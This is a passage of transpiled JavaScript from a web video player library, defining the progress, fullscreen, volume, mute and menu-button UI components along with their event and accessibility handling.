
  ProgressControl.prototype.handleMouseUp = function handleMouseUp(event) {
    var doc = this.el_.ownerDocument;
    var seekBar = this.getChild('seekBar');

    if (seekBar) {
      seekBar.handleMouseUp(event);
    }

    this.off(doc, 'mousemove', this.throttledHandleMouseSeek);
    this.off(doc, 'touchmove', this.throttledHandleMouseSeek);
    this.off(doc, 'mouseup', this.handleMouseUp);
    this.off(doc, 'touchend', this.handleMouseUp);
  };

  return ProgressControl;
}(Component);

/**
 * Default options for `ProgressControl`
 *
 * @type {Object}
 * @private
 */


ProgressControl.prototype.options_ = {
  children: ['seekBar']
};

Component.registerComponent('ProgressControl', ProgressControl);

/**
 * @file fullscreen-toggle.js
 */
/**
 * Toggle fullscreen video
 *
 * @extends Button
 */

var FullscreenToggle = function (_Button) {
  inherits(FullscreenToggle, _Button);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function FullscreenToggle(player, options) {
    classCallCheck(this, FullscreenToggle);

    var _this = possibleConstructorReturn(this, _Button.call(this, player, options));

    _this.on(player, 'fullscreenchange', _this.handleFullscreenChange);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  FullscreenToggle.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-fullscreen-control ' + _Button.prototype.buildCSSClass.call(this);
  };

  /**
   * Handles fullscreenchange on the player and change control text accordingly.
   *
   * @param {EventTarget~Event} [event]
   *        The {@link Player#fullscreenchange} event that caused this function to be
   *        called.
   *
   * @listens Player#fullscreenchange
   */


  FullscreenToggle.prototype.handleFullscreenChange = function handleFullscreenChange(event) {
    if (this.player_.isFullscreen()) {
      this.controlText('Non-Fullscreen');
    } else {
      this.controlText('Fullscreen');
    }
  };

  /**
   * This gets called when an `FullscreenToggle` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  FullscreenToggle.prototype.handleClick = function handleClick(event) {
    if (!this.player_.isFullscreen()) {
      this.player_.requestFullscreen();
    } else {
      this.player_.exitFullscreen();
    }
  };

  return FullscreenToggle;
}(Button);

/**
 * The text that should display over the `FullscreenToggle`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


FullscreenToggle.prototype.controlText_ = 'Fullscreen';

Component.registerComponent('FullscreenToggle', FullscreenToggle);

/**
 * Check if volume control is supported and if it isn't hide the
 * `Component` that was passed  using the `vjs-hidden` class.
 *
 * @param {Component} self
 *        The component that should be hidden if volume is unsupported
 *
 * @param {Player} player
 *        A reference to the player
 *
 * @private
 */
var checkVolumeSupport = function checkVolumeSupport(self, player) {
  // hide volume controls when they're not supported by the current tech
  if (player.tech_ && !player.tech_.featuresVolumeControl) {
    self.addClass('vjs-hidden');
  }

  self.on(player, 'loadstart', function () {
    if (!player.tech_.featuresVolumeControl) {
      self.addClass('vjs-hidden');
    } else {
      self.removeClass('vjs-hidden');
    }
  });
};

/**
 * @file volume-level.js
 */
/**
 * Shows volume level
 *
 * @extends Component
 */

var VolumeLevel = function (_Component) {
  inherits(VolumeLevel, _Component);

  function VolumeLevel() {
    classCallCheck(this, VolumeLevel);
    return possibleConstructorReturn(this, _Component.apply(this, arguments));
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */
  VolumeLevel.prototype.createEl = function createEl() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-volume-level',
      innerHTML: '<span class="vjs-control-text"></span>'
    });
  };

  return VolumeLevel;
}(Component);

Component.registerComponent('VolumeLevel', VolumeLevel);

/**
 * @file volume-bar.js
 */
// Required children
/**
 * The bar that contains the volume level and can be clicked on to adjust the level
 *
 * @extends Slider
 */

var VolumeBar = function (_Slider) {
  inherits(VolumeBar, _Slider);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function VolumeBar(player, options) {
    classCallCheck(this, VolumeBar);

    var _this = possibleConstructorReturn(this, _Slider.call(this, player, options));

    _this.on('slideractive', _this.updateLastVolume_);
    _this.on(player, 'volumechange', _this.updateARIAAttributes);
    player.ready(function () {
      return _this.updateARIAAttributes();
    });
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  VolumeBar.prototype.createEl = function createEl$$1() {
    return _Slider.prototype.createEl.call(this, 'div', {
      className: 'vjs-volume-bar vjs-slider-bar'
    }, {
      'aria-label': this.localize('Volume Level'),
      'aria-live': 'polite'
    });
  };

  /**
   * Handle mouse down on volume bar
   *
   * @param {EventTarget~Event} event
   *        The `mousedown` event that caused this to run.
   *
   * @listens mousedown
   */


  VolumeBar.prototype.handleMouseDown = function handleMouseDown(event) {
    if (!isSingleLeftClick(event)) {
      return;
    }

    _Slider.prototype.handleMouseDown.call(this, event);
  };

  /**
   * Handle movement events on the {@link VolumeMenuButton}.
   *
   * @param {EventTarget~Event} event
   *        The event that caused this function to run.
   *
   * @listens mousemove
   */


  VolumeBar.prototype.handleMouseMove = function handleMouseMove(event) {
    if (!isSingleLeftClick(event)) {
      return;
    }

    this.checkMuted();
    this.player_.volume(this.calculateDistance(event));
  };

  /**
   * If the player is muted unmute it.
   */


  VolumeBar.prototype.checkMuted = function checkMuted() {
    if (this.player_.muted()) {
      this.player_.muted(false);
    }
  };

  /**
   * Get percent of volume level
   *
   * @return {number}
   *         Volume level percent as a decimal number.
   */


  VolumeBar.prototype.getPercent = function getPercent() {
    if (this.player_.muted()) {
      return 0;
    }
    return this.player_.volume();
  };

  /**
   * Increase volume level for keyboard users
   */


  VolumeBar.prototype.stepForward = function stepForward() {
    this.checkMuted();
    this.player_.volume(this.player_.volume() + 0.1);
  };

  /**
   * Decrease volume level for keyboard users
   */


  VolumeBar.prototype.stepBack = function stepBack() {
    this.checkMuted();
    this.player_.volume(this.player_.volume() - 0.1);
  };

  /**
   * Update ARIA accessibility attributes
   *
   * @param {EventTarget~Event} [event]
   *        The `volumechange` event that caused this function to run.
   *
   * @listens Player#volumechange
   */


  VolumeBar.prototype.updateARIAAttributes = function updateARIAAttributes(event) {
    var ariaValue = this.player_.muted() ? 0 : this.volumeAsPercentage_();

    this.el_.setAttribute('aria-valuenow', ariaValue);
    this.el_.setAttribute('aria-valuetext', ariaValue + '%');
  };

  /**
   * Returns the current value of the player volume as a percentage
   *
   * @private
   */


  VolumeBar.prototype.volumeAsPercentage_ = function volumeAsPercentage_() {
    return Math.round(this.player_.volume() * 100);
  };

  /**
   * When user starts dragging the VolumeBar, store the volume and listen for
   * the end of the drag. When the drag ends, if the volume was set to zero,
   * set lastVolume to the stored volume.
   *
   * @listens slideractive
   * @private
   */


  VolumeBar.prototype.updateLastVolume_ = function updateLastVolume_() {
    var _this2 = this;

    var volumeBeforeDrag = this.player_.volume();

    this.one('sliderinactive', function () {
      if (_this2.player_.volume() === 0) {
        _this2.player_.lastVolume_(volumeBeforeDrag);
      }
    });
  };

  return VolumeBar;
}(Slider);

/**
 * Default options for the `VolumeBar`
 *
 * @type {Object}
 * @private
 */


VolumeBar.prototype.options_ = {
  children: ['volumeLevel'],
  barName: 'volumeLevel'
};

/**
 * Call the update event for this Slider when this event happens on the player.
 *
 * @type {string}
 */
VolumeBar.prototype.playerEvent = 'volumechange';

Component.registerComponent('VolumeBar', VolumeBar);

/**
 * @file volume-control.js
 */
// Required children
/**
 * The component for controlling the volume level
 *
 * @extends Component
 */

var VolumeControl = function (_Component) {
  inherits(VolumeControl, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   */
  function VolumeControl(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, VolumeControl);

    options.vertical = options.vertical || false;

    // Pass the vertical option down to the VolumeBar if
    // the VolumeBar is turned on.
    if (typeof options.volumeBar === 'undefined' || isPlain(options.volumeBar)) {
      options.volumeBar = options.volumeBar || {};
      options.volumeBar.vertical = options.vertical;
    }

    // hide this control if volume support is missing
    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    checkVolumeSupport(_this, player);

    _this.throttledHandleMouseMove = throttle(bind(_this, _this.handleMouseMove), 25);

    _this.on('mousedown', _this.handleMouseDown);
    _this.on('touchstart', _this.handleMouseDown);

    // while the slider is active (the mouse has been pressed down and
    // is dragging) or in focus we do not want to hide the VolumeBar
    _this.on(_this.volumeBar, ['focus', 'slideractive'], function () {
      _this.volumeBar.addClass('vjs-slider-active');
      _this.addClass('vjs-slider-active');
      _this.trigger('slideractive');
    });

    _this.on(_this.volumeBar, ['blur', 'sliderinactive'], function () {
      _this.volumeBar.removeClass('vjs-slider-active');
      _this.removeClass('vjs-slider-active');
      _this.trigger('sliderinactive');
    });
    return _this;
  }

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  VolumeControl.prototype.createEl = function createEl() {
    var orientationClass = 'vjs-volume-horizontal';

    if (this.options_.vertical) {
      orientationClass = 'vjs-volume-vertical';
    }

    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-volume-control vjs-control ' + orientationClass
    });
  };

  /**
   * Handle `mousedown` or `touchstart` events on the `VolumeControl`.
   *
   * @param {EventTarget~Event} event
   *        `mousedown` or `touchstart` event that triggered this function
   *
   * @listens mousedown
   * @listens touchstart
   */


  VolumeControl.prototype.handleMouseDown = function handleMouseDown(event) {
    var doc = this.el_.ownerDocument;

    this.on(doc, 'mousemove', this.throttledHandleMouseMove);
    this.on(doc, 'touchmove', this.throttledHandleMouseMove);
    this.on(doc, 'mouseup', this.handleMouseUp);
    this.on(doc, 'touchend', this.handleMouseUp);
  };

  /**
   * Handle `mouseup` or `touchend` events on the `VolumeControl`.
   *
   * @param {EventTarget~Event} event
   *        `mouseup` or `touchend` event that triggered this function.
   *
   * @listens touchend
   * @listens mouseup
   */


  VolumeControl.prototype.handleMouseUp = function handleMouseUp(event) {
    var doc = this.el_.ownerDocument;

    this.off(doc, 'mousemove', this.throttledHandleMouseMove);
    this.off(doc, 'touchmove', this.throttledHandleMouseMove);
    this.off(doc, 'mouseup', this.handleMouseUp);
    this.off(doc, 'touchend', this.handleMouseUp);
  };

  /**
   * Handle `mousedown` or `touchstart` events on the `VolumeControl`.
   *
   * @param {EventTarget~Event} event
   *        `mousedown` or `touchstart` event that triggered this function
   *
   * @listens mousedown
   * @listens touchstart
   */


  VolumeControl.prototype.handleMouseMove = function handleMouseMove(event) {
    this.volumeBar.handleMouseMove(event);
  };

  return VolumeControl;
}(Component);

/**
 * Default options for the `VolumeControl`
 *
 * @type {Object}
 * @private
 */


VolumeControl.prototype.options_ = {
  children: ['volumeBar']
};

Component.registerComponent('VolumeControl', VolumeControl);

/**
 * @file mute-toggle.js
 */
/**
 * A button component for muting the audio.
 *
 * @extends Button
 */

var MuteToggle = function (_Button) {
  inherits(MuteToggle, _Button);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function MuteToggle(player, options) {
    classCallCheck(this, MuteToggle);

    // hide this control if volume support is missing
    var _this = possibleConstructorReturn(this, _Button.call(this, player, options));

    checkVolumeSupport(_this, player);

    _this.on(player, ['loadstart', 'volumechange'], _this.update);
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  MuteToggle.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-mute-control ' + _Button.prototype.buildCSSClass.call(this);
  };

  /**
   * This gets called when an `MuteToggle` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  MuteToggle.prototype.handleClick = function handleClick(event) {
    var vol = this.player_.volume();
    var lastVolume = this.player_.lastVolume_();

    if (vol === 0) {
      var volumeToSet = lastVolume < 0.1 ? 0.1 : lastVolume;

      this.player_.volume(volumeToSet);
      this.player_.muted(false);
    } else {
      this.player_.muted(this.player_.muted() ? false : true);
    }
  };

  /**
   * Update the `MuteToggle` button based on the state of `volume` and `muted`
   * on the player.
   *
   * @param {EventTarget~Event} [event]
   *        The {@link Player#loadstart} event if this function was called
   *        through an event.
   *
   * @listens Player#loadstart
   * @listens Player#volumechange
   */


  MuteToggle.prototype.update = function update(event) {
    this.updateIcon_();
    this.updateControlText_();
  };

  /**
   * Update the appearance of the `MuteToggle` icon.
   *
   * Possible states (given `level` variable below):
   * - 0: crossed out
   * - 1: zero bars of volume
   * - 2: one bar of volume
   * - 3: two bars of volume
   *
   * @private
   */


  MuteToggle.prototype.updateIcon_ = function updateIcon_() {
    var vol = this.player_.volume();
    var level = 3;

    if (vol === 0 || this.player_.muted()) {
      level = 0;
    } else if (vol < 0.33) {
      level = 1;
    } else if (vol < 0.67) {
      level = 2;
    }

    // TODO improve muted icon classes
    for (var i = 0; i < 4; i++) {
      removeClass(this.el_, 'vjs-vol-' + i);
    }
    addClass(this.el_, 'vjs-vol-' + level);
  };

  /**
   * If `muted` has changed on the player, update the control text
   * (`title` attribute on `vjs-mute-control` element and content of
   * `vjs-control-text` element).
   *
   * @private
   */


  MuteToggle.prototype.updateControlText_ = function updateControlText_() {
    var soundOff = this.player_.muted() || this.player_.volume() === 0;
    var text = soundOff ? 'Unmute' : 'Mute';

    if (this.controlText() !== text) {
      this.controlText(text);
    }
  };

  return MuteToggle;
}(Button);

/**
 * The text that should display over the `MuteToggle`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */


MuteToggle.prototype.controlText_ = 'Mute';

Component.registerComponent('MuteToggle', MuteToggle);

/**
 * @file volume-control.js
 */
// Required children
/**
 * A Component to contain the MuteToggle and VolumeControl so that
 * they can work together.
 *
 * @extends Component
 */

var VolumePanel = function (_Component) {
  inherits(VolumePanel, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   */
  function VolumePanel(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, VolumePanel);

    if (typeof options.inline !== 'undefined') {
      options.inline = options.inline;
    } else {
      options.inline = true;
    }

    // pass the inline option down to the VolumeControl as vertical if
    // the VolumeControl is on.
    if (typeof options.volumeControl === 'undefined' || isPlain(options.volumeControl)) {
      options.volumeControl = options.volumeControl || {};
      options.volumeControl.vertical = !options.inline;
    }

    // hide this control if volume support is missing
    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    checkVolumeSupport(_this, player);

    // while the slider is active (the mouse has been pressed down and
    // is dragging) we do not want to hide the VolumeBar
    _this.on(_this.volumeControl, ['slideractive'], _this.sliderActive_);

    _this.on(_this.volumeControl, ['sliderinactive'], _this.sliderInactive_);
    return _this;
  }

  /**
   * Add vjs-slider-active class to the VolumePanel
   *
   * @listens VolumeControl#slideractive
   * @private
   */


  VolumePanel.prototype.sliderActive_ = function sliderActive_() {
    this.addClass('vjs-slider-active');
  };

  /**
   * Removes vjs-slider-active class to the VolumePanel
   *
   * @listens VolumeControl#sliderinactive
   * @private
   */


  VolumePanel.prototype.sliderInactive_ = function sliderInactive_() {
    this.removeClass('vjs-slider-active');
  };

  /**
   * Create the `Component`'s DOM element
   *
   * @return {Element}
   *         The element that was created.
   */


  VolumePanel.prototype.createEl = function createEl() {
    var orientationClass = 'vjs-volume-panel-horizontal';

    if (!this.options_.inline) {
      orientationClass = 'vjs-volume-panel-vertical';
    }

    return _Component.prototype.createEl.call(this, 'div', {
      className: 'vjs-volume-panel vjs-control ' + orientationClass
    });
  };

  return VolumePanel;
}(Component);

/**
 * Default options for the `VolumeControl`
 *
 * @type {Object}
 * @private
 */


VolumePanel.prototype.options_ = {
  children: ['muteToggle', 'volumeControl']
};

Component.registerComponent('VolumePanel', VolumePanel);

/**
 * @file menu.js
 */
/**
 * The Menu component is used to build popup menus, including subtitle and
 * captions selection menus.
 *
 * @extends Component
 */

var Menu = function (_Component) {
  inherits(Menu, _Component);

  /**
   * Create an instance of this class.
   *
   * @param {Player} player
   *        the player that this component should attach to
   *
   * @param {Object} [options]
   *        Object of option names and values
   *
   */
  function Menu(player, options) {
    classCallCheck(this, Menu);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    if (options) {
      _this.menuButton_ = options.menuButton;
    }

    _this.focusedChild_ = -1;

    _this.on('keydown', _this.handleKeyPress);
    return _this;
  }

  /**
   * Add a {@link MenuItem} to the menu.
   *
   * @param {Object|string} component
   *        The name or instance of the `MenuItem` to add.
   *
   */


  Menu.prototype.addItem = function addItem(component) {
    this.addChild(component);
    component.on('click', bind(this, function (event) {
      // Unpress the associated MenuButton, and move focus back to it
      if (this.menuButton_) {
        this.menuButton_.unpressButton();

        // don't focus menu button if item is a caption settings item
        // because focus will move elsewhere and it logs an error on IE8
        if (component.name() !== 'CaptionSettingsMenuItem') {
          this.menuButton_.focus();
        }
      }
    }));
  };

  /**
   * Create the `Menu`s DOM element.
   *
   * @return {Element}
   *         the element that was created
   */


  Menu.prototype.createEl = function createEl$$1() {
    var contentElType = this.options_.contentElType || 'ul';

    this.contentEl_ = createEl(contentElType, {
      className: 'vjs-menu-content'
    });

    this.contentEl_.setAttribute('role', 'menu');

    var el = _Component.prototype.createEl.call(this, 'div', {
      append: this.contentEl_,
      className: 'vjs-menu'
    });

    el.appendChild(this.contentEl_);

    // Prevent clicks from bubbling up. Needed for Menu Buttons,
    // where a click on the parent is significant
    on(el, 'click', function (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    });

    return el;
  };

  Menu.prototype.dispose = function dispose() {
    this.contentEl_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Handle a `keydown` event on this menu. This listener is added in the constructor.
   *
   * @param {EventTarget~Event} event
   *        A `keydown` event that happened on the menu.
   *
   * @listens keydown
   */


  Menu.prototype.handleKeyPress = function handleKeyPress(event) {
    // Left and Down Arrows
    if (event.which === 37 || event.which === 40) {
      event.preventDefault();
      this.stepForward();

      // Up and Right Arrows
    } else if (event.which === 38 || event.which === 39) {
      event.preventDefault();
      this.stepBack();
    }
  };

  /**
   * Move to next (lower) menu item for keyboard users.
   */


  Menu.prototype.stepForward = function stepForward() {
    var stepChild = 0;

    if (this.focusedChild_ !== undefined) {
      stepChild = this.focusedChild_ + 1;
    }
    this.focus(stepChild);
  };

  /**
   * Move to previous (higher) menu item for keyboard users.
   */


  Menu.prototype.stepBack = function stepBack() {
    var stepChild = 0;

    if (this.focusedChild_ !== undefined) {
      stepChild = this.focusedChild_ - 1;
    }
    this.focus(stepChild);
  };

  /**
   * Set focus on a {@link MenuItem} in the `Menu`.
   *
   * @param {Object|string} [item=0]
   *        Index of child item set focus on.
   */


  Menu.prototype.focus = function focus() {
    var item = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 0;

    var children = this.children().slice();
    var haveTitle = children.length && children[0].className && /vjs-menu-title/.test(children[0].className);

    if (haveTitle) {
      children.shift();
    }

    if (children.length > 0) {
      if (item < 0) {
        item = 0;
      } else if (item >= children.length) {
        item = children.length - 1;
      }

      this.focusedChild_ = item;

      children[item].el_.focus();
    }
  };

  return Menu;
}(Component);

Component.registerComponent('Menu', Menu);

/**
 * @file menu-button.js
 */
/**
 * A `MenuButton` class for any popup {@link Menu}.
 *
 * @extends Component
 */

var MenuButton = function (_Component) {
  inherits(MenuButton, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   */
  function MenuButton(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, MenuButton);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.menuButton_ = new Button(player, options);

    _this.menuButton_.controlText(_this.controlText_);
    _this.menuButton_.el_.setAttribute('aria-haspopup', 'true');

    // Add buildCSSClass values to the button, not the wrapper
    var buttonClass = Button.prototype.buildCSSClass();

    _this.menuButton_.el_.className = _this.buildCSSClass() + ' ' + buttonClass;
    _this.menuButton_.removeClass('vjs-control');

    _this.addChild(_this.menuButton_);

    _this.update();

    _this.enabled_ = true;

    _this.on(_this.menuButton_, 'tap', _this.handleClick);
    _this.on(_this.menuButton_, 'click', _this.handleClick);
    _this.on(_this.menuButton_, 'focus', _this.handleFocus);
    _this.on(_this.menuButton_, 'blur', _this.handleBlur);

    _this.on('keydown', _this.handleSubmenuKeyPress);
    return _this;
  }

  /**
   * Update the menu based on the current state of its items.
   */


  MenuButton.prototype.update = function update() {
    var menu = this.createMenu();

    if (this.menu) {
      this.menu.dispose();
      this.removeChild(this.menu);
    }

    this.menu = menu;
    this.addChild(menu);

    /**
     * Track the state of the menu button
     *
     * @type {Boolean}
     * @private
     */
    this.buttonPressed_ = false;
    this.menuButton_.el_.setAttribute('aria-expanded', 'false');

    if (this.items && this.items.length <= this.hideThreshold_) {
      this.hide();
    } else {
      this.show();
    }
  };

  /**
   * Create the menu and add all items to it.
   *
   * @return {Menu}
   *         The constructed menu
   */


  MenuButton.prototype.createMenu = function createMenu() {
    var menu = new Menu(this.player_, { menuButton: this });

    /**
     * Hide the menu if the number of items is less than or equal to this threshold. This defaults
     * to 0 and whenever we add items which can be hidden to the menu we'll increment it. We list
     * it here because every time we run `createMenu` we need to reset the value.
     *
     * @protected
     * @type {Number}
     */
    this.hideThreshold_ = 0;

    // Add a title list item to the top
    if (this.options_.title) {
      var title = createEl('li', {
        className: 'vjs-menu-title',
        innerHTML: toTitleCase(this.options_.title),
        tabIndex: -1
      });

      this.hideThreshold_ += 1;

      menu.children_.unshift(title);
      prependTo(title, menu.contentEl());
    }

    this.items = this.createItems();

    if (this.items) {
      // Add menu items to the menu
      for (var i = 0; i < this.items.length; i++) {
        menu.addItem(this.items[i]);
      }
    }

    return menu;
  };

  /**
   * Create the list of menu items. Specific to each subclass.
   *
   * @abstract
   */


  MenuButton.prototype.createItems = function createItems() {};

  /**
   * Create the `MenuButtons`s DOM element.
   *
   * @return {Element}
   *         The element that gets created.
   */


  MenuButton.prototype.createEl = function createEl$$1() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: this.buildWrapperCSSClass()
    }, {});
  };

  /**
   * Allow sub components to stack CSS class names for the wrapper element
   *
   * @return {string}
   *         The constructed wrapper DOM `className`
   */


  MenuButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    var menuButtonClass = 'vjs-menu-button';

    // If the inline option is passed, we want to use different styles altogether.
    if (this.options_.inline === true) {
      menuButtonClass += '-inline';
    } else {
      menuButtonClass += '-popup';
    }

    // TODO: Fix the CSS so that this isn't necessary
    var buttonClass = Button.prototype.buildCSSClass();

    return 'vjs-menu-button ' + menuButtonClass + ' ' + buttonClass + ' ' + _Component.prototype.buildCSSClass.call(this);
  };

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  MenuButton.prototype.buildCSSClass = function buildCSSClass() {
    var menuButtonClass = 'vjs-menu-button';

    // If the inline option is passed, we want to use different styles altogether.
    if (this.options_.inline === true) {
      menuButtonClass += '-inline';
    } else {
      menuButtonClass += '-popup';
    }

    return 'vjs-menu-button ' + menuButtonClass + ' ' + _Component.prototype.buildCSSClass.call(this);
  };

  /**
   * Get or set the localized control text that will be used for accessibility.
   *
   * > NOTE: This will come from the internal `menuButton_` element.
   *
   * @param {string} [text]
   *        Control text for element.
   *
   * @param {Element} [el=this.menuButton_.el()]
   *        Element to set the title on.
   *
   * @return {string}
   *         - The control text when getting
   */


  MenuButton.prototype.controlText = function controlText(text) {
    var el = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : this.menuButton_.el();

    return this.menuButton_.controlText(text, el);
  };

  /**
   * Handle a click on a `MenuButton`.
   * See {@link ClickableComponent#handleClick} for instances where this is called.
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  MenuButton.prototype.handleClick = function handleClick(event) {
    // When you click the button it adds focus, which will show the menu.
    // So we'll remove focus when the mouse leaves the button. Focus is needed
    // for tab navigation.

    this.one(this.menu.contentEl(), 'mouseleave', bind(this, function (e) {
      this.unpressButton();
      this.el_.blur();
    }));
    if (this.buttonPressed_) {
      this.unpressButton();
    } else {
      this.pressButton();
    }
  };

  /**
   * Set the focus to the actual button, not to this element
   */


  MenuButton.prototype.focus = function focus() {
    this.menuButton_.focus();
  };

  /**
   * Remove the focus from the actual button, not this element
   */


  MenuButton.prototype.blur = function blur() {
    this.menuButton_.blur();
  };

  /**
   * This gets called when a `MenuButton` gains focus via a `focus` event.
   * Turns on listening for `keydown` events. When they happen it
   * calls `this.handleKeyPress`.
   *
   * @param {EventTarget~Event} event
   *        The `focus` event that caused this function to be called.
   *
   * @listens focus
   */


  MenuButton.prototype.handleFocus = function handleFocus() {
    on(document_1, 'keydown', bind(this, this.handleKeyPress));
  };

  /**
   * Called when a `MenuButton` loses focus. Turns off the listener for
   * `keydown` events. Which Stops `this.handleKeyPress` from getting called.
   *
   * @param {EventTarget~Event} event
   *        The `blur` event that caused this function to be called.
   *
   * @listens blur
   */


  MenuButton.prototype.handleBlur = function handleBlur() {
    off(document_1, 'keydown', bind(this, this.handleKeyPress));
  };

  /**
   * Handle tab, escape, down arrow, and up arrow keys for `MenuButton`. See
   * {@link ClickableComponent#handleKeyPress} for instances where this is called.
   *
   * @param {EventTarget~Event} event
   *        The `keydown` event that caused this function to be called.
   *
   * @listens keydown
   */


  MenuButton.prototype.handleKeyPress = function handleKeyPress(event) {

    // Escape (27) key or Tab (9) key unpress the 'button'
    if (event.which === 27 || event.which === 9) {
      if (this.buttonPressed_) {
        this.unpressButton();
      }
      // Don't preventDefault for Tab key - we still want to lose focus
      if (event.which !== 9) {
        event.preventDefault();
        // Set focus back to the menu button's button
        this.menuButton_.el_.focus();
      }
      // Up (38) key or Down (40) key press the 'button'
    } else if (event.which === 38 || event.which === 40) {
      if (!this.buttonPressed_) {
        this.pressButton();
        event.preventDefault();
      }
    }
  };

  /**
   * Handle a `keydown` event on a sub-menu. The listener for this is added in
   * the constructor.
   *
   * @param {EventTarget~Event} event
   *        Key press event
   *
   * @listens keydown
   */


  MenuButton.prototype.handleSubmenuKeyPress = function handleSubmenuKeyPress(event) {

    // Escape (27) key or Tab (9) key unpress the 'button'
    if (event.which === 27 || event.which === 9) {
      if (this.buttonPressed_) {
        this.unpressButton();
      }
      // Don't preventDefault for Tab key - we still want to lose focus
      if (event.which !== 9) {
        event.preventDefault();
        // Set focus back to the menu button's button
        this.menuButton_.el_.focus();
      }
    }
  };

  /**
   * Put the current `MenuButton` into a pressed state.
   */


  MenuButton.prototype.pressButton = function pressButton() {
    if (this.enabled_) {
      this.buttonPressed_ = true;
      this.menu.lockShowing();
      this.menuButton_.el_.setAttribute('aria-expanded', 'true');

      // set the focus into the submenu, except on iOS where it is resulting in
      // undesired scrolling behavior when the player is in an iframe
      if (IS_IOS && isInFrame()) {
        // Return early so that the menu isn't focused
        return;
      }

      this.menu.focus();
    }
  };

  /**
   * Take the current `MenuButton` out of a pressed state.
   */


  MenuButton.prototype.unpressButton = function unpressButton() {
    if (this.enabled_) {
      this.buttonPressed_ = false;
      this.menu.unlockShowing();
      this.menuButton_.el_.setAttribute('aria-expanded', 'false');
    }
  };

  /**
   * Disable the `MenuButton`. Don't allow it to be clicked.
   */


  MenuButton.prototype.disable = function disable() {
    this.unpressButton();

    this.enabled_ = false;
    this.addClass('vjs-disabled');

    this.menuButton_.disable();
  };

  /**
   * Enable the `MenuButton`. Allow it to be clicked.
   */


  MenuButton.prototype.enable = function enable() {
    this.enabled_ = true;
    this.removeClass('vjs-disabled');

    this.menuButton_.enable();
  };

  return MenuButton;
}(Component);

Component.registerComponent('MenuButton', MenuButton);

/**
 * @file track-button.js
 */
/**
 * The base class for buttons that toggle specific  track types (e.g. subtitles).
 *
 * @extends MenuButton
 */

var TrackButton = function (_MenuButton) {
  inherits(TrackButton, _MenuButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function TrackButton(player, options) {
    classCallCheck(this, TrackButton);

    var tracks = options.tracks;

    var _this = possibleConstructorReturn(this, _MenuButton.call(this, player, options));

    if (_this.items.length <= 1) {
      _this.hide();
    }

    if (!tracks) {
      return possibleConstructorReturn(_this);
    }

    var updateHandler = bind(_this, _this.update);

    tracks.addEventListener('removetrack', updateHandler);
    tracks.addEventListener('addtrack', updateHandler);
    _this.player_.on('ready', updateHandler);

    _this.player_.on('dispose', function () {
      tracks.removeEventListener('removetrack', updateHandler);
      tracks.removeEventListener('addtrack', updateHandler);
    });
    return _this;
  }

  return TrackButton;
}(MenuButton);

Component.registerComponent('TrackButton', TrackButton);

/**
 * @file menu-item.js
 */
/**
 * The component for a menu item. `<li>`
 *
 * @extends ClickableComponent
 */

var MenuItem = function (_ClickableComponent) {
  inherits(MenuItem, _ClickableComponent);

  /**
   * Creates an instance of the this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   *
   */
  function MenuItem(player, options) {
